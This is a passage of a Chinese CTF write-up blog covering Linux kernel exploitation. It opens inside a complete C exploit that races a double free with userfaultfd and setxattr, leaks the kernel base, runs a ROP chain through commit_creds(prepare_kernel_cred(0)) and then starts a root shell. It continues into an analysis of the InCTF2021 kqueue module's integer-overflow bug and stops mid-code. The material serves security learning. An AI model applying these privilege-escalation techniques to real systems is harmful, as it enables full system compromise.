class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">            close(seq_fd_reserve[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trigger</span></span><br><span class="line">        pop_rdi_ret += kernel_offset;</span><br><span class="line">        xchg_rax_rdi_ret += kernel_offset;</span><br><span class="line">        mov_rdi_rax_pop_rbp_ret += kernel_offset;</span><br><span class="line">        prepare_kernel_cred = <span class="number">0xffffffff81069e00</span> + kernel_offset;</span><br><span class="line">        commit_creds = <span class="number">0xffffffff81069c10</span> + kernel_offset;</span><br><span class="line">        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line">        __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12,   0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    </span><br><span class="line">            <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10,   commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] back to userland successfully!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] execve root shell now...&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0001</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;push!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">(<span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(dev_fd, <span class="number">0x57AC0002</span>, data) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pop!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span>      data[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_leak;</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_uaf;</span><br><span class="line">    <span class="type">char</span>        *uffd_buf_hack;</span><br><span class="line">    <span class="type">int</span>         pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         shm_id;</span><br><span class="line">    <span class="type">char</span>        *shm_addr;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/proc/stack&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// reserve object to protect freelist</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> ((seq_fd_reserve[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;seq reserve!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for leak</span></span><br><span class="line">    uffd_buf_leak = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// left dirty data in kmalloc-32</span></span><br><span class="line">    shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmget!&quot;</span>);</span><br><span class="line">    shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmat!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel base    </span></span><br><span class="line">    push(uffd_buf_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for double free</span></span><br><span class="line">    uffd_buf_uaf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct the double free</span></span><br><span class="line">    push(<span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    pop(uffd_buf_uaf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create uffd thread for hijack</span></span><br><span class="line">    uffd_buf_hack = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size * <span class="number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, <span class="number">0xffffffff814d51c0</span> + kernel_offset);</span><br><span class="line">    *(<span class="type">size_t</span> *)(uffd_buf_hack + page_size - <span class="number">8</span>) = <span class="number">0xffffffff814d51c0</span> + kernel_offset;    <span class="comment">// add rsp , 0x1c8 ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread</span></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, uffd_buf_hack + page_size - <span class="number">8</span>, <span class="number">32</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h3><ol><li>注册userfaultfd的过程中可能会用到一些object,因此为了避免其影响,可以<strong>尽量早</strong>的完成注册</li><li>构造double free之后,两次申请出同一个object会破坏slab,从而导致后续如果使用到了该slab会发生错误,为了避免这种情况,我们可以提前申请合适数目的obj,然后在double free之后将其释放,以此修复slab链</li></ol><h2 id="InCTF2021-kqueue"><a href="#InCTF2021-kqueue" class="headerlink" title="InCTF2021-kqueue"></a>InCTF2021-kqueue</h2><h3 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m <span class="number">512</span> \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure><p>kpti和smap,smep都没开启,只有一个kaslr,这样就可以ret2usr了</p><h3 id="模块-2"><a href="#模块-2" class="headerlink" title="模块"></a>模块</h3><p>题目直接给出了模块的源码,那就不需要逆向了</p><p>只注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">kqueue_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;operations_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user((<span class="type">void</span> *)&amp;request, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))&#123;</span><br><span class="line">        err(<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_KQUEUE:</span><br><span class="line">            result = create_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DELETE_KQUEUE:</span><br><span class="line">            result = delete_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EDIT_KQUEUE:</span><br><span class="line">            result = edit_kqueue(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAVE:</span><br><span class="line">            result = save_kqueue_entries(request);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ret: </span><br><span class="line">    mutex_unlock(&amp;operations_lock);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且有加锁</p><p>要传入的结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br></pre></td></tr></table></figure><p>此外还定义了一个err函数,在检查不通过时便会调用,但实际上不通过也不会有任何问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">err</span><span class="params">(<span class="type">char</span>* msg)</span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>create_kqueue</strong></p><p>主要是进行队列的创建，限制了队列数量与大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="type">long</span> result = INVALID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(queueCount &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Max queue count reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries&lt;<span class="number">1</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Asking for too much is also not good */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize kqueue_entry structure */</span></span><br><span class="line">    queue_entry *kqueue_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class="line">    ull space = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class="line">    ull queue_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(__builtin_saddll_overflow(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>),space,&amp;queue_size) == <span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Integer overflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Total size should not exceed a certain limit */</span></span><br><span class="line">    <span class="keyword">if</span>(queue_size&gt;<span class="keyword">sizeof</span>(<span class="built_in">queue</span>) + <span class="number">0x10000</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All checks done , now call kzalloc */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate((<span class="type">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Main queue can also store data */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill the remaining queue structure */</span></span><br><span class="line">    <span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line">    <span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the place from where memory has to be handled */</span></span><br><span class="line">    kqueue_entry = (queue_entry *)((<span class="type">uint64_t</span>)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate all kqueue entries */</span></span><br><span class="line">    queue_entry* current_entry = kqueue_entry;</span><br><span class="line">    queue_entry* prev_entry = current_entry;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find an appropriate slot in kqueues */</span></span><br><span class="line">    <span class="type">uint32_t</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;MAX_QUEUES;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kqueues[j] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j&gt;MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class="line">    kqueues[j] = <span class="built_in">queue</span>;</span><br><span class="line">    queueCount++;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中一个 queue 结构体定义如下，大小为 0x18：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint64_t</span> queue_size; <span class="comment">/* This needs to handle larger numbers */</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure><p>有一个全局指针数组保存分配的 queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="built_in">queue</span> *)<span class="literal">NULL</span>&#125;;</span><br></pre></td></tr></table></figure><p>在这里用到了 <a href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc 内置函数</a> <code>__builtin_umulll_overflow</code>，主要作用就是将前两个参数相乘给到第三个参数，发生溢出则返回 true，<code>__builtin_saddll_overflow</code> 与之类似不过是加法</p><p>那么这里虽然 queue 结构体的成员数量似乎是固定的，但是在 kmalloc 时传入的 size 为 <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>，其剩余的空间用作 queue_entry 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    queue_entry *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里存在一个<strong>整型溢出漏洞</strong>：如果在 <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> 中我们传入的 <code>request.max_entries</code> 为 <code>0xffffffff</code>，加一后变为0，此时便能通过检测，但 space 最终的结果为0，从而在后续进行 kmalloc 时便只分配了一个 queue 的大小，但是存放到 queue 的 max_entries 域的值为 <code>request.max_entries</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>-&gt;data_size   = request.data_size;</span><br><span class="line"><span class="built_in">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class="line"><span class="built_in">queue</span>-&gt;queue_size  = queue_size;</span><br></pre></td></tr></table></figure><p>在分配 queue-&gt;data 时给 kmalloc 传入的大小为 <code>request.data_size</code>，限制为 0x20</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>-&gt;data = validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br></pre></td></tr></table></figure><p>接下来会为每一个 queue_entry 的 data 域都分配一块内存，大小为 <code>request.data_size</code>，且 queue_entry 从低地址向高地址连接成一个单向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=request.max_entries)</span><br><span class="line">            prev_entry-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        current_entry-&gt;idx = i;</span><br><span class="line">        current_entry-&gt;data = (<span class="type">char</span> *)(validate((<span class="type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Increment current_entry by size of queue_entry */</span></span><br><span class="line">        current_entry += <span class="keyword">sizeof</span>(queue_entry)/<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Populate next pointer of the previous entry */</span></span><br><span class="line">        prev_entry-&gt;next = current_entry;</span><br><span class="line">        prev_entry = prev_entry-&gt;next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在最后会在 kqueue 数组中找一个空的位置把分配的 queue 指针放进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 